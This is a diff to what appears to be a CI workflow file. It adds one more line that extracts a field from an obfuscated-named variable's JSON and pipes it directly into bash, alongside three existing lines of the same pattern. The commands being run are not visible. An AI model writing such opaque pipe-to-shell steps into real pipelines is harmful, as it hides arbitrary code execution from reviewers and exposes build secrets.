@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$x0988" | jq -r .igon33 | /bin/bash
           echo $gjrie154 | jq -r .nifh31 | /bin/bash
           echo $o034 | jq -r .wnlj130 | /bin/bash
+          echo $cnvur9 | jq -r .j5 | /bin/bash
 
       - name: Archive output
         if: always()
